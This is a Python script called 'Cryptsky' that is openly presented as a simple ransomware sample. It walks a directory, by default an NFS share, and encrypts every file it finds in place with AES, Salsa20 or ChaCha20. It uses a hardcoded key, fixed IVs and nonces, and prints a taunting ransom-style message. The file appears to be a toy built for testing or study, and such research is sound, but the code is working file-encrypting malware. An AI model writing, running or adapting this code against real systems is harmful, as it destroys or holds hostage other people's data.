#!/usr/bin/python3
from Crypto.Cipher import AES,Salsa20,ChaCha20
from Crypto.Util import Counter
from Crypto.Util.Padding import pad,unpad
import argparse
import os

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'.encode('utf-8')


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    parser.add_argument('-a', '--algo', help='Crypto Algo', default="AES")
    parser.add_argument('-m', '--mode', help='AES mode', default="CTR")
    parser.add_argument('-p', '--path', help='Add the path to encrypt/decrypt',
                        default='/mnt/nfs_shared')
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    algo = args['algo']
    user_mode = args['mode']
    try:
        mode = getattr(AES, f"MODE_{user_mode.upper()}")
    except AttributeError:
        raise ValueError(f"Unsupported mode: AES {user_mode}")

    if decrypt:
        print(f"\
Cryptsky!\
---------------\
Your files have been encrypted.Happy decrypting and be more careful next time!\
\
Your decryption key is: {HARDCODED_KEY}\
")
        #key = raw_input('Enter Your Key> ')
        key = HARDCODED_KEY

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    if algo == 'AES':
        if mode in (AES.MODE_CBC, AES.MODE_CFB, AES.MODE_OFB):
            print(AES.block_size)
            iv = 'initial_vectors!'.encode('utf-8')
            crypt = AES.new(key, mode, iv=iv)
        elif mode == AES.MODE_CTR:
            ctr = Counter.new(128)
            print(ctr)
            crypt = AES.new(key, mode, counter=ctr)
        else:
            print(AES.block_size)
            crypt = AES.new(key, mode)
    elif algo == 'Salsa20':
        nonce = 'nonce_b!'.encode("utf-8")
        crypt = Salsa20.new(key=key, nonce=nonce)
    elif algo == 'ChaCha20':
        nonce = 'nonce_bytes!'.encode("utf-8")
        key256 = key+key
        crypt = ChaCha20.new(key=key256, nonce=nonce)

    # change this to fit your needs.
    startdirs = [args['path']]

    for currentDir in startdirs:
        for f in discover.discoverFiles(currentDir):
            print(f)
            if decrypt:
                modify.modify_file_inplace(f, crypt, encrypt=0)
            else:
                modify.modify_file_inplace(f, crypt, encrypt=1)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
